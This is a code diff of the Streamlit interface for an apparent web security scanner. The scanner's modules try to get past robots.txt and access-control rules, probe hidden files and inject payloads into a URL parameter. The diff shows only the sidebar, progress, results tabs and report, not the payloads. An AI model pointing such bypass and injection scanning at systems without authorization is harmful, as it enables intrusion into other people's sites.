 # ─── Sidebar ──────────────────────────────────────────────────────────────────
-st.markdown("## 🛡️ Zwanski Security Scanner")
+st.markdown("## 🛡️ Zwanski Security Scanner v2")
 st.markdown(
-    "**Advanced Bypass Edition** — Forces access to robots.txt disallowed paths\n\n"
-    "> ⚠️ **Use only on systems you own or have explicit written permission to test.**"
+    "**Real Bypass Edition** — header injection, method override, path confusion, sitemap harvest\n\n"
+    "> ⚠️ **Authorized targets only.**"
 )
 st.divider()
 
 with st.sidebar:
     st.markdown("### ⚙️ Configuration")
     target_url = st.text_input("Target URL", placeholder="https://example.com")
-    
-    st.markdown("### 🎯 Bypass Modules")
-    enable_robots_bypass = st.checkbox("Robots.txt Bypass (Force Disallowed)", value=True)
-    enable_hidden_files = st.checkbox("Aggressive Hidden Files", value=True)
+
+    st.markdown("### 🎯 Modules")
+    enable_robots_bypass = st.checkbox("Robots.txt / ACL Bypass", value=True)
+    enable_hidden_files = st.checkbox("Hidden Files", value=True)
     enable_injection = st.checkbox("Parameter Injection", value=False)
-    enable_endpoints = st.checkbox("Endpoint Discovery", value=False)
-    
+    enable_endpoints = st.checkbox("Sitemap/Endpoint Probe", value=True)
+
     test_param = st.text_input("Injection parameter", value="id")
     timeout_val = st.slider("Request timeout (s)", 3, 30, 10)
-    rate_val = st.slider("Rate limit (s)", 0.1, 2.0, 0.3, 0.1)
-    
+    workers_val = st.slider("Concurrent workers", 1, 30, 10)
+    rate_val = st.slider("Inter-request delay (s)", 0.0, 2.0, 0.1, 0.05)
+
     st.divider()
-    start_btn = st.button("🚀 Force Scan", type="primary", use_container_width=True)
+    start_btn = st.button("🚀 Run Scan", type="primary", use_container_width=True)
     clear_btn = st.button("🧹 Clear Results", use_container_width=True)
 
 if clear_btn:
-    for _k in ("scan_done", "robots_results", "hidden_files", "injections", "endpoints"):
-        st.session_state[_k] = {} if _k == "robots_results" else ([] if _k != "scan_done" else False)
+    for k, v in _DEFAULTS.items():
+        st.session_state[k] = v
     st.rerun()
+
 
 # ─── Run Scan ─────────────────────────────────────────────────────────────────
 if start_btn:
     if not target_url:
         st.error("Enter a target URL first.")
+    elif not target_url.startswith(("http://", "https://")):
+        st.error("URL must start with http:// or https://")
     else:
-        scanner = SecurityScanner(target_url, timeout=timeout_val, rate_limit=rate_val)
+        try:
+            scanner = SecurityScanner(
+                target_url,
+                timeout=timeout_val,
+                rate_limit=rate_val,
+                workers=workers_val,
+            )
+        except Exception as e:
+            st.error(f"Failed to init scanner: {e}")
+            st.stop()
+
         prog = st.progress(0.0)
         msg = st.empty()
-        
-        modules_active = sum([enable_robots_bypass, enable_hidden_files, enable_injection, enable_endpoints])
+
+        modules = [enable_robots_bypass, enable_hidden_files, enable_injection, enable_endpoints]
+        total_modules = max(sum(modules), 1)
         base = 0.0
-        
+
         if enable_robots_bypass:
-            msg.info("🔄 Parsing robots.txt and forcing disallowed paths...")
+            msg.info("🤖 Parsing robots.txt + sitemap, running bypass matrix…")
             st.session_state["robots_results"] = scanner.scan_robots_bypass(
-                lambda p: prog.progress(min(base + p / modules_active, 1.0)))
-            base += 1 / modules_active
-        
+                lambda p: prog.progress(min(base + p / total_modules, 1.0))
+            )
+            base += 1 / total_modules
+
         if enable_hidden_files:
-            msg.info("📁 Aggressive hidden file scanning with encoding bypass...")
-            st.session_state["hidden_files"] = scanner.scan_hidden_files_aggressive(
-                lambda p: prog.progress(min(base + p / modules_active, 1.0)))
-            base += 1 / modules_active
-        
+            msg.info("📁 Probing hidden files / sensitive paths…")
+            st.session_state["hidden_files"] = scanner.scan_hidden_files(
+                lambda p: prog.progress(min(base + p / total_modules, 1.0))
+            )
+            base += 1 / total_modules
+
         if enable_injection:
-            msg.info("💉 Testing parameter injection...")
+            msg.info(f"💉 Injecting payloads into ?{test_param}=…")
             st.session_state["injections"] = scanner.scan_parameter_injection(
-                test_param, lambda p: prog.progress(min(base + p / modules_active, 1.0)))
-            base += 1 / modules_active
-        
+                test_param,
+                lambda p: prog.progress(min(base + p / total_modules, 1.0)),
+            )
+            base += 1 / total_modules
+
         if enable_endpoints:
-            msg.info("🔗 Discovering endpoints...")
+            msg.info("🔗 Probing sitemap + robots URLs…")
             st.session_state["endpoints"] = scanner.scan_endpoints(
-                lambda p: prog.progress(min(base + p / modules_active, 1.0)))
-        
+                lambda p: prog.progress(min(base + p / total_modules, 1.0))
+            )
+
         prog.progress(1.0)
-        msg.success("✅ Scan complete!")
+        msg.success("✅ Scan complete")
         st.session_state["scan_done"] = True
-        time.sleep(0.6)
+        time.sleep(0.4)
         prog.empty()
         msg.empty()
 
+
 # ─── Results ──────────────────────────────────────────────────────────────────
 if st.session_state["scan_done"]:
-    robots_results = st.session_state.get("robots_results", {})
-    hf = st.session_state.get("hidden_files", [])
-    inj = st.session_state.get("injections", [])
-    ep = st.session_state.get("endpoints", [])
-    
-    # Calculate metrics
-    disallowed_count = robots_results.get('total_disallowed', 0)
-    bypassed_count = robots_results.get('successful_bypasses', 0)
-    critical_count = len(robots_results.get('critical_findings', []))
-    hidden_count = len([x for x in hf if x.get('bypass_success')])
-    
+    rr = st.session_state["robots_results"]
+    hf = st.session_state["hidden_files"]
+    inj = st.session_state["injections"]
+    ep = st.session_state["endpoints"]
+
+    disallowed_count = rr.get("total_disallowed", 0)
+    bypassed_count = rr.get("successful_bypass_count", 0)
+    critical_count = len(rr.get("critical_findings", []))
+    hidden_count = len([x for x in hf if x["status"] == 200])
+
     c1, c2, c3, c4 = st.columns(4)
     for col, val, label, color in [
         (c1, disallowed_count, "Disallowed Paths", "#ff4b4b"),
-        (c2, bypassed_count, "Bypassed Paths", "#00ff9f"),
+        (c2, bypassed_count, "Bypass Hits", "#00ff9f"),
         (c3, critical_count, "Critical Findings", "#ffa726"),
-        (c4, hidden_count, "Hidden Files Bypassed", "#2979ff"),
+        (c4, hidden_count, "Hidden Files (200)", "#2979ff"),
     ]:
         with col:
             st.markdown(
@@ -564,146 +684,110 @@ if st.session_state["scan_done"]:
                 unsafe_allow_html=True,
             )
     st.divider()
-    
-    # Create tabs
-    tabs = []
+
+    # Tabs
+    tab_labels = []
+    if enable_robots_bypass: tab_labels.append("🤖 Robots Bypass")
+    if enable_hidden_files:  tab_labels.append("📁 Hidden Files")
+    if enable_injection:     tab_labels.append("💉 Injections")
+    if enable_endpoints:     tab_labels.append("🔗 Endpoints")
+    tab_labels.append("📄 Report")
+    tabs = st.tabs(tab_labels)
+    idx = 0
+
     if enable_robots_bypass:
-        tabs.append("🤖 Robots Bypass")
+        with tabs[idx]:
+            st.subheader("🤖 Robots.txt / ACL Bypass")
+            if rr.get("robots_content"):
+                with st.expander("📋 robots.txt"):
+                    st.code(rr["robots_content"])
+            if rr.get("sitemaps"):
+                st.markdown(f"**Sitemaps found:** {len(rr['sitemaps'])}")
+                for s in rr["sitemaps"]:
+                    st.markdown(f"- `{s}`")
+            st.markdown(f"**Sitemap URLs harvested:** {rr.get('sitemap_urls_count', 0)}")
+
+            if rr.get("critical_findings"):
+                st.error(f"⚠️ **{len(rr['critical_findings'])} CRITICAL FINDINGS**")
+                for f in rr["critical_findings"]:
+                    with st.expander(f"🚨 {f['path']} — {f['technique']} ({f['kind']})"):
+                        st.markdown(f'<div class="mono-block">{f["url"]}</div>', unsafe_allow_html=True)
+                        st.markdown(f"**Status:** {f['status']}")
+                        for e in f.get("evidence", []):
+                            st.markdown(f"- {e}")
+
+            st.markdown("### All Bypass Attempts")
+            for result in rr.get("bypass_results", []):
+                path = result["path"]
+                successes = result["successful_bypasses"]
+                icon = "✅" if successes else "❌"
+                with st.expander(f"{icon} {path} — {len(successes)}/{result['attempts']} succeeded (baseline: {result['baseline_status']})"):
+                    if not successes:
+                        st.caption("No bypass worked on this path.")
+                    for s in successes:
+                        st.success(f"**{s['kind']}** → {s['technique']} ({s['method']})")
+                        st.markdown(f'<div class="mono-block">{s["url"]}</div>', unsafe_allow_html=True)
+                        if s.get("headers"):
+                            st.code(json.dumps(s["headers"], indent=2), language="json")
+                        st.markdown(f"**Status:** {s['status']} | **Size:** {s['size']}")
+                        for e in s.get("evidence", []):
+                            st.markdown(f"- {e}")
+        idx += 1
+
     if enable_hidden_files:
-        tabs.append("📁 Hidden Files")
+        with tabs[idx]:
+            st.subheader("📁 Hidden Files")
+            if not hf:
+                st.info("Nothing interesting found.")
+            for item in sorted(hf, key=lambda x: (x["status"] != 200, x["path"])):
+                badge = "badge-vuln" if item["status"] == 200 else ("badge-bypass" if item["status"] in (401, 403) else "badge-safe")
+                with st.expander(f"{'🔥' if item['status']==200 else '🔒'} {item['path']} [{item['status']}]"):
+                    st.markdown(f'<div class="mono-block">{item["url"]}</div>', unsafe_allow_html=True)
+                    st.markdown(f"**Size:** {item['size']} bytes")
+                    for e in item.get("evidence", []):
+                        st.markdown(f"- {e}")
+        idx += 1
+
     if enable_injection:
-        tabs.append("💉 Injections")
-    if enable_endpoints:
-        tabs.append("🔗 Endpoints")
-    tabs.append("📄 Report")
-    
-    tab_objects = st.tabs(tabs)
-    
-    tab_index = 0
-    
-    # Robots Bypass Tab
-    if enable_robots_bypass:
-        with tab_objects[tab_index]:
-            st.subheader("🤖 Robots.txt Bypass Results")
-            
-            if robots_results.get('robots_content'):
-                with st.expander("📋 View robots.txt"):
-                    st.code(robots_results['robots_content'])
-            
-            st.markdown(f"### Disallowed Paths ({disallowed_count})")
-            
-            if robots_results.get('critical_findings'):
-                st.error(f"⚠️ **{len(robots_results['critical_findings'])} CRITICAL FINDINGS**")
-                for finding in robots_results['critical_findings']:
-                    with st.expander(f"🚨 {finding['path']} - {finding['technique']}"):
-                        st.markdown(f'<div class="mono-block">{finding["url"]}</div>', unsafe_allow_html=True)
-                        for evidence in finding.get('evidence', []):
-                            st.markdown(f"- {evidence}")
-            
-            # Show bypass results
-            for result in robots_results.get('bypass_results', []):
-                path = result.get('original_path', '')
-                successful = result.get('successful_bypasses', [])
-                
-                if successful:
-                    icon = "✅" if len(successful) > 0 else "❌"
-                    with st.expander(f"{icon} {path} ({len(successful)} bypasses)"):
-                        st.markdown(f"**Original Path:** `{path}`")
-                        
-                        if result.get('direct_accessible'):
-                            st.warning("Direct access possible without bypass!")
-                        
-                        for bypass in successful:
-                            st.success(f"✅ Bypassed using: **{bypass['technique']}**")
-                            st.markdown(f'<div class="mono-block">{bypass["url"]}</div>', unsafe_allow_html=True)
-                            st.markdown(f"**Status:** {bypass['status_code']}")
-                            for evidence in bypass.get('evidence', []):
-                                st.markdown(f"- {evidence}")
-                        
-                        # Show failed bypasses
-                        failed = [b for b in result.get('bypasses', []) if not b.get('success')]
-                        if failed:
-                            with st.expander(f"View {len(failed)} failed attempts"):
-                                for fail in failed[:5]:
-                                    st.markdown(f"- {fail['technique']}: {fail['status_code']}")
-        
-        tab_index += 1
-    
-    # Hidden Files Tab
-    if enable_hidden_files:
-        with tab_objects[tab_index]:
-            st.subheader("📁 Hidden Files (Aggressive Encoding Bypass)")
-            
-            # Filter bypassed files
-            bypassed_files = [x for x in hf if x.get('bypass_success')]
-            if bypassed_files:
-                st.success(f"🎯 **{len(bypassed_files)} files bypassed using encoding!**")
-                
-                for item in bypassed_files:
-                    with st.expander(f"✅ {item['path']} - Level {item['encoding_level']} encoding"):
-                        st.markdown(f'<div class="mono-block">{item["url"]}</div>', unsafe_allow_html=True)
-                        st.markdown(f"**Encoded:** `{item['encoded']}`")
-                        st.markdown(f"**Status:** {item['status']} | **Size:** {item['size']} bytes")
-                        for evidence in item.get('evidence', []):
-                            st.markdown(f"- {evidence}")
-            
-            # Show other findings
-            other_files = [x for x in hf if not x.get('bypass_success') and x.get('status') == 200]
-            if other_files:
-                st.markdown("### Other Accessible Files")
-                for item in other_files:
-                    with st.expander(f"📄 {item['path']} - {item['status']}"):
-                        st.markdown(f'<div class="mono-block">{item["url"]}</div>', unsafe_allow_html=True)
-                        for evidence in item.get('evidence', []):
-                            st.markdown(f"- {evidence}")
-        
-        tab_index += 1
-    
-    # Injections Tab
-    if enable_injection:
-        with tab_objects[tab_index]:
-            st.subheader("💉 Parameter Injection Findings")
+        with tabs[idx]:
+            st.subheader("💉 Parameter Injection")
             if not inj:
-                st.success("No injection vectors detected.")
+                st.success("No injection vectors confirmed.")
             for item in inj:
-                with st.expander(f"⚠️ {item['category'].upper()} • Level {item.get('level', '?')}"):
-                    st.markdown(f"**Payload:** `{item.get('payload', 'N/A')}`")
-                    st.markdown(f'<div class="mono-block">{item.get("encoded", "")}</div>', unsafe_allow_html=True)
-                    for e in item.get('evidence', []):
+                with st.expander(f"⚠️ {item['category'].upper()} — `{item['payload']}`"):
+                    st.markdown(f'<div class="mono-block">{item["url"]}</div>', unsafe_allow_html=True)
+                    for e in item.get("evidence", []):
                         st.markdown(f"- {e}")
-        
-        tab_index += 1
-    
-    # Endpoints Tab
+        idx += 1
+
     if enable_endpoints:
-        with tab_objects[tab_index]:
-            st.subheader("🔗 Endpoint Discovery")
+        with tabs[idx]:
+            st.subheader("🔗 Endpoints")
             if not ep:
-                st.info("No interesting endpoints found.")
-            for item in ep:
-                with st.expander(f"🔗 {item.get('endpoint', 'Unknown')} [{item.get('status', '?')}]"):
-                    st.markdown(f'<div class="mono-block">{item.get("url", "")}</div>', unsafe_allow_html=True)
-                    for e in item.get('evidence', []):
+                st.info("No accessible endpoints discovered.")
+            for item in sorted(ep, key=lambda x: x["status"]):
+                with st.expander(f"🔗 {item['endpoint']} [{item['status']}]"):
+                    st.markdown(f'<div class="mono-block">{item["url"]}</div>', unsafe_allow_html=True)
+                    for e in item.get("evidence", []):
                         st.markdown(f"- {e}")
-        
-        tab_index += 1
-    
-    # Report Tab
-    with tab_objects[-1]:
+        idx += 1
+
+    with tabs[-1]:
         st.subheader("📄 JSON Report")
         report = {
             "target": target_url,
             "scan_time": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+            "scanner": "Zwanski Security Scanner v2",
             "summary": {
                 "disallowed_paths": disallowed_count,
                 "bypassed_paths": bypassed_count,
                 "critical_findings": critical_count,
-                "hidden_files": len(hf),
-                "hidden_files_bypassed": hidden_count,
+                "hidden_files_total": len(hf),
+                "hidden_files_200": hidden_count,
                 "injections": len(inj),
                 "endpoints": len(ep),
             },
-            "robots_bypass": robots_results,
+            "robots_bypass": rr,
             "hidden_files": hf,
             "injections": inj,
             "endpoints": ep,
@@ -711,20 +795,19 @@ if st.session_state["scan_done"]:
         st.download_button(
             "📥 Download JSON Report",
             data=json.dumps(report, indent=2),
-            file_name=f"bypass_scan_{int(time.time())}.json",
+            file_name=f"zwanski_scan_{int(time.time())}.json",
             mime="application/json",
         )
-        st.json(report)
-
+        st.json(report, expanded=False)
 else:
     st.markdown("""
     <div style="text-align:center;padding:60px 0;color:#8b949e;">
-        <div style="font-size:3rem">🤖</div>
+        <div style="font-size:3rem">🛡️</div>
         <p style="font-family:'Syne',sans-serif;font-size:1.2rem;margin-top:16px">
-            Configure a target and enable <strong>Robots.txt Bypass</strong> to force access
+            Enter a target, pick modules, run the scan.
         </p>
         <p style="font-size:.85rem;margin-top:8px">
-            Authorized targets only — testphp.vulnweb.com · demo.testfire.net
+            Lab targets: testphp.vulnweb.com · demo.testfire.net
         </p>
     </div>
     """, unsafe_allow_html=True)
